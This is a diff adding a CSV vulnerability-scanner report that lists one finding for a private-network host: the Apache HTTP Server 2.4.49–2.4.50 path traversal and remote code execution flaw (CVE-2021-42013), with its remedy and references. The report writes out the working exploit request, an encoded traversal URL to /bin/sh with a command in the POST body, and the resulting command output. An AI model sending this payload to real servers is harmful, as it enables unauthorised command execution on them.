@@ -1,0 +1,32 @@
+IP,Hostname,Port,Port Protocol,CVSS,Severity,QoD,Solution Type,NVT Name,Summary,Specific Result,NVT OID,CVEs,Task ID,Task Name,Timestamp,Result ID,Impact,Solution,Affected Software/OS,Vulnerability Insight,Vulnerability Detection Method,Product Detection Result,BIDs,CERTs,Other References
+,,,,,,,,,,,,,,,,,,,,,,,,,
+      192.168.1.33,,8080,tcp,9.8,High,100,VendorFix,Apache HTTP Server 2.4.49 - 2.4.50 Directory Traversal / RCE Vulnerability - Active Check,"Apache HTTP Server is prone to a directory traversal
+  and a possible remote code execution (RCE) vulnerability.","By doing the following HTTP request:
+
+Affected URL     : http://192.168.1.33:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh
+HTTP ""POST"" body : echo;id
+HTTP Method      : POST
+
+it was possible to execute the ""id"" command on the target host.
+
+Result:
+
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+
+",1.3.6.1.4.1.25623.1.0.146871,CVE-2021-42013,813039b7-1097-4d53-9eea-9e91447568a4,Immediate scan of IP 192.168.1.33,2025-11-05T20:46:31Z,3fbb0418-fb71-43b7-972b-fa877f5b84e3,,Update to version 2.4.51 or later.,Apache HTTP Server version 2.4.49 through 2.4.50.,"An attacker could use a path traversal attack to map URLs to
+  files outside the expected document root.
+
+  If files outside of the document root are not protected by 'require all denied' these requests
+  can succeed. Additionally this flaw could leak the source of interpreted files like CGI scripts.
+
+  Note: If 'mod_cgi' is enabled this flaw can be also be used by an attacker to achieve remote code
+  execution (RCE).","Sends multiple crafted HTTP GET/POST requests and checks the
+  responses.
+Details:
+Apache HTTP Server 2.4.49 - 2.4.50 Directory Traversal / RCE Vulnerability -...
+(OID: 1.3.6.1.4.1.25623.1.0.146871)
+Version used: 2025-04-15T05:54:49Z
+","Product: cpe:/a:apache:http_server:2.4.49
+Method: Apache HTTP Server Detection Consolidation
+(OID: 1.3.6.1.4.1.25623.1.0.117232)
+",,"DFN-CERT-2022-0867,DFN-CERT-2021-2185,DFN-CERT-2021-2099,WID-SEC-2024-1591,WID-SEC-2022-1025,CB-K22/0473,CB-K21/1029",
